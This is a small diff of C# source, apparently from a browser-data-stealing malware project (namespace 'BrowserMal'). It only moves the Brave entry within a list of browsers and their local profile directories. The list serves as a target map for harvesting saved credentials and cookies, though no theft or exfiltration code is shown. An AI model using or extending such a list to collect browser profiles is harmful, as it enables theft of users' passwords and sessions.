@@ -16,6 +16,7 @@ namespace BrowserMal.Browser
         public void Init()
         {
 			_browserModelsList.Add(new BrowserModel("Comodo Dragon", Path.Combine(LocalApplicationData, @"Comodo\Dragon\User Data"), "dragon"));
+			_browserModelsList.Add(new BrowserModel("Brave Browser", Path.Combine(LocalApplicationData, @"BraveSoftware\Brave-Browser\User Data"), "brave"));
 			_browserModelsList.Add(new BrowserModel("Chrome", Path.Combine(LocalApplicationData + @"\Google\Chrome\User Data"), "chrome"));
 			_browserModelsList.Add(new BrowserModel("Opera", Path.Combine(ApplicationData, @"Opera Software\Opera Stable"), "opera"));
 			_browserModelsList.Add(new BrowserModel("Yandex", Path.Combine(LocalApplicationData, @"Yandex\YandexBrowser\User Data"), ""));
@@ -23,7 +24,6 @@ namespace BrowserMal.Browser
 			_browserModelsList.Add(new BrowserModel("CoolNovo", Path.Combine(LocalApplicationData, @"MapleStudio\ChromePlus\User Data"), ""));
 			_browserModelsList.Add(new BrowserModel("SRWare Iron", Path.Combine(LocalApplicationData, @"Chromium\User Data"), ""));
 			_browserModelsList.Add(new BrowserModel("Torch Browser", Path.Combine(LocalApplicationData, @"Torch\User Data"), ""));
-			_browserModelsList.Add(new BrowserModel("Brave Browser", Path.Combine(LocalApplicationData, @"BraveSoftware\Brave-Browser\User Data"), "brave"));
 			_browserModelsList.Add(new BrowserModel("Iridium Browser", Path.Combine(LocalApplicationData + @"\Iridium\User Data"), ""));
 			_browserModelsList.Add(new BrowserModel("7Star", Path.Combine(LocalApplicationData, @"7Star\7Star\User Data"), ""));
 			_browserModelsList.Add(new BrowserModel("Amigo", Path.Combine(LocalApplicationData, @"Amigo\User Data"), ""));
